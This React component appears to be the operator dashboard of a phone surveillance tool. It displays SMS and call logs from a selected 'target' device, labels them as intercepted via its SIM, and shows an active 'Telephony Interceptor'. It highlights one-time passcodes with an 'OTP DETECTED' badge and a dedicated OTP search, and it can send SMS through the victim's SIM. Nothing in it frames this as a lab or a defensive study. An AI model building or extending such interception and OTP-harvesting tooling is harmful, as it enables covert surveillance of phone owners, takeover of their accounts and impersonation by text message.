import React, { useState, useEffect } from 'react';
import { 
  MessageSquare, 
  PhoneCall, 
  Send, 
  PhoneIncoming, 
  PhoneOutgoing, 
  PhoneMissed, 
  Search, 
  Plus, 
  Smartphone,
  ShieldCheck,
  KeyRound
} from 'lucide-react';
import { DeviceInfo, DeviceMessage, DeviceCall } from '../types.ts';
import { Language, translations } from '../translations.ts';
import { safeFetchJson } from '../utils/api.ts';

interface CommsAuditProps {
  devices: DeviceInfo[];
  selectedDevice: DeviceInfo | null;
  onSelectDevice: (device: DeviceInfo) => void;
  lang: Language;
}

export const CommsAudit: React.FC<CommsAuditProps> = ({
  devices,
  selectedDevice,
  onSelectDevice,
  lang,
}) => {
  const t = translations[lang];
  const currentDevice = selectedDevice || devices[0];

  const [activeTab, setActiveTab] = useState<'sms' | 'calls'>('sms');
  const [messages, setMessages] = useState<DeviceMessage[]>([]);
  const [calls, setCalls] = useState<DeviceCall[]>([]);
  const [searchQuery, setSearchQuery] = useState('');
  
  // New SMS Modal
  const [isSendSmsOpen, setIsSendSmsOpen] = useState(false);
  const [receiverNumber, setReceiverNumber] = useState('');
  const [smsBody, setSmsBody] = useState('');
  const [sendingSms, setSendingSms] = useState(false);
  const [notice, setNotice] = useState<string | null>(null);

  const fetchComms = async () => {
    if (!currentDevice) return;
    const [msgData, callData] = await Promise.all([
      safeFetchJson<{ success: boolean; messages: DeviceMessage[] }>(`/api/devices/${currentDevice.id}/messages`),
      safeFetchJson<{ success: boolean; calls: DeviceCall[] }>(`/api/devices/${currentDevice.id}/calls`),
    ]);

    if (msgData?.success && Array.isArray(msgData.messages)) {
      setMessages(msgData.messages);
    }
    if (callData?.success && Array.isArray(callData.calls)) {
      setCalls(callData.calls);
    }
  };

  useEffect(() => {
    fetchComms();
  }, [currentDevice]);

  const handleSendSms = async () => {
    if (!receiverNumber.trim() || !smsBody.trim() || !currentDevice) return;
    setSendingSms(true);
    try {
      const data = await safeFetchJson<any>(`/api/devices/${currentDevice.id}/messages/send`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ receiver: receiverNumber, body: smsBody }),
      });
      if (data?.success) {
        setNotice(`SMS dispatched to ${receiverNumber}`);
        setIsSendSmsOpen(false);
        setReceiverNumber('');
        setSmsBody('');
        fetchComms();
        setTimeout(() => setNotice(null), 4000);
      }
    } finally {
      setSendingSms(false);
    }
  };

  const filteredMessages = messages.filter(
    (m) => m.sender.toLowerCase().includes(searchQuery.toLowerCase()) || m.body.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const filteredCalls = calls.filter(
    (c) => c.contactName.toLowerCase().includes(searchQuery.toLowerCase()) || c.phoneNumber.includes(searchQuery)
  );

  return (
    <div className="space-y-4">
      
      {/* Top Device Bar & Quick Send Toolbar */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 p-4 rounded-xl border border-slate-800 bg-slate-900/60">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-lg bg-purple-950/60 border border-purple-800/80 flex items-center justify-center text-purple-400">
            <MessageSquare className="w-5 h-5" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-sm font-semibold text-white">Target Telephony:</span>
              <select
                value={currentDevice?.id || ''}
                onChange={(e) => {
                  const target = devices.find(d => d.id === e.target.value);
                  if (target) onSelectDevice(target);
                }}
                className="bg-slate-950 border border-slate-800 rounded px-2.5 py-1 text-xs font-semibold text-white focus:outline-none focus:border-sky-500"
              >
                {devices.map(d => (
                  <option key={d.id} value={d.id}>{d.name} ({d.os})</option>
                ))}
              </select>
            </div>
            <div className="text-[11px] text-slate-400 font-mono mt-0.5">
              <span>SIM State: Ready (MCI / Irancell 5G)</span>
              <span aria-hidden="true" className="mx-1.5">·</span>
              <span>Telephony Interceptor: ACTIVE</span>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-2">
          {/* Segmented SMS / Call Tab Switcher */}
          <div className="flex items-center gap-1 p-1 bg-slate-950 rounded-lg border border-slate-800 text-xs">
            <button
              onClick={() => setActiveTab('sms')}
              className={`px-3 py-1.5 rounded-md font-medium transition-colors cursor-pointer ${
                activeTab === 'sms' ? 'bg-slate-800 text-sky-400 font-semibold' : 'text-slate-400 hover:text-white'
              }`}
            >
              SMS Messages ({messages.length})
            </button>
            <button
              onClick={() => setActiveTab('calls')}
              className={`px-3 py-1.5 rounded-md font-medium transition-colors cursor-pointer ${
                activeTab === 'calls' ? 'bg-slate-800 text-sky-400 font-semibold' : 'text-slate-400 hover:text-white'
              }`}
            >
              Call History ({calls.length})
            </button>
          </div>

          <button
            onClick={() => setIsSendSmsOpen(true)}
            className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-semibold text-white bg-sky-600 hover:bg-sky-500 rounded-lg transition-colors cursor-pointer whitespace-nowrap"
          >
            <Send className="w-3.5 h-3.5" />
            <span>{t.sendSms}</span>
          </button>
        </div>
      </div>

      {notice && (
        <div className="p-3 bg-emerald-950/80 border border-emerald-800 rounded-lg text-xs font-mono text-emerald-300">
          {notice}
        </div>
      )}

      {/* Search Input Bar */}
      <div className="relative">
        <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
        <input
          type="text"
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          placeholder={activeTab === 'sms' ? 'Search messages or OTP codes...' : 'Search call logs...'}
          className="w-full pl-9 pr-4 py-2 bg-slate-950 border border-slate-800 rounded-lg text-xs text-white placeholder-slate-500 focus:outline-none focus:border-sky-500"
        />
      </div>

      {/* SMS Content View */}
      {activeTab === 'sms' ? (
        <div className="space-y-3">
          {filteredMessages.map((msg) => {
            const hasOtp = /\b\d{4,8}\b/.test(msg.body);
            return (
              <div 
                key={msg.id}
                className="p-4 rounded-xl border border-slate-800 bg-slate-900/40 hover:bg-slate-900/70 transition-all space-y-2"
              >
                <div className="flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2">
                    <span className="font-bold text-white text-sm">{msg.sender}</span>
                    <span className={`text-[10px] font-mono px-2 py-0.5 rounded border uppercase ${
                      msg.type === 'incoming' 
                        ? 'bg-sky-950/60 text-sky-400 border-sky-800/60' 
                        : 'bg-emerald-950/60 text-emerald-400 border-emerald-800/60'
                    }`}>
                      {msg.type}
                    </span>
                    {hasOtp && (
                      <span className="flex items-center gap-1 text-[10px] font-mono px-2 py-0.5 rounded bg-amber-950/50 text-amber-400 border border-amber-800/60">
                        <KeyRound className="w-3 h-3" />
                        <span>OTP DETECTED</span>
                      </span>
                    )}
                  </div>
                  <span className="text-slate-500 font-mono text-[11px]">
                    {new Date(msg.timestamp).toLocaleString()}
                  </span>
                </div>

                <div className="text-xs text-slate-200 leading-relaxed font-sans bg-slate-950/60 p-3 rounded-lg border border-slate-850">
                  {msg.body}
                </div>

                <div className="flex items-center justify-between text-[11px] font-mono text-slate-500">
                  <span>To: {msg.receiver}</span>
                  <span>Intercepted via SIM Slot 1</span>
                </div>
              </div>
            );
          })}
        </div>
      ) : (
        /* Calls Content View */
        <div className="rounded-xl border border-slate-800 bg-slate-900/40 overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-xs text-left">
              <thead>
                <tr className="border-b border-slate-800 bg-slate-950/80 text-slate-400 font-mono">
                  <th className="py-3 px-4 font-medium">CONTACT / CALLER</th>
                  <th className="py-3 px-4 font-medium">PHONE NUMBER</th>
                  <th className="py-3 px-4 font-medium">TYPE</th>
                  <th className="py-3 px-4 font-medium">DURATION</th>
                  <th className="py-3 px-4 font-medium text-right">TIMESTAMP</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60 font-mono">
                {filteredCalls.map((call) => (
                  <tr key={call.id} className="hover:bg-slate-850/60 transition-colors">
                    <td className="py-3 px-4 font-sans font-semibold text-white whitespace-nowrap">
                      {call.contactName}
                    </td>
                    <td className="py-3 px-4 text-slate-300 whitespace-nowrap">{call.phoneNumber}</td>
                    <td className="py-3 px-4 whitespace-nowrap">
                      <span className={`inline-flex items-center gap-1.5 ${
                        call.callType === 'incoming' 
                          ? 'text-sky-400' 
                          : call.callType === 'outgoing' 
                          ? 'text-emerald-400' 
                          : 'text-rose-400'
                      }`}>
                        {call.callType === 'incoming' ? <PhoneIncoming className="w-3.5 h-3.5" /> : call.callType === 'outgoing' ? <PhoneOutgoing className="w-3.5 h-3.5" /> : <PhoneMissed className="w-3.5 h-3.5" />}
                        <span className="capitalize">{call.callType}</span>
                      </span>
                    </td>
                    <td className="py-3 px-4 text-slate-400 tabular-nums whitespace-nowrap">
                      {call.durationSeconds > 0 ? `${call.durationSeconds}s` : 'Missed'}
                    </td>
                    <td className="py-3 px-4 text-slate-500 text-right whitespace-nowrap">
                      {new Date(call.timestamp).toLocaleString()}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Send SMS Modal */}
      {isSendSmsOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4">
          <div className="w-full max-w-md rounded-xl border border-slate-800 bg-slate-950 p-6 space-y-4">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Send className="w-4 h-4 text-sky-400" />
              <span>{t.sendSms}</span>
            </h3>
            <p className="text-xs text-slate-400">
              Dispatches SMS through {currentDevice.name}'s cellular carrier SIM.
            </p>

            <div className="space-y-3">
              <div>
                <label className="text-[11px] font-mono text-slate-400 block mb-1">RECEIVER NUMBER</label>
                <input
                  type="text"
                  value={receiverNumber}
                  onChange={(e) => setReceiverNumber(e.target.value)}
                  placeholder={t.enterReceiver}
                  className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-800 rounded-md text-white font-mono"
                />
              </div>

              <div>
                <label className="text-[11px] font-mono text-slate-400 block mb-1">MESSAGE TEXT</label>
                <textarea
                  value={smsBody}
                  onChange={(e) => setSmsBody(e.target.value)}
                  placeholder={t.enterMessage}
                  rows={3}
                  className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-800 rounded-md text-white font-sans resize-none"
                />
              </div>
            </div>

            <div className="flex items-center justify-end gap-2 pt-2">
              <button
                onClick={() => setIsSendSmsOpen(false)}
                className="px-4 py-2 text-xs text-slate-400 hover:text-white"
              >
                {t.cancel}
              </button>
              <button
                onClick={handleSendSms}
                disabled={sendingSms}
                className="px-4 py-2 text-xs font-semibold bg-sky-600 hover:bg-sky-500 text-white rounded-md cursor-pointer"
              >
                {sendingSms ? 'Dispatching...' : t.send}
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
};
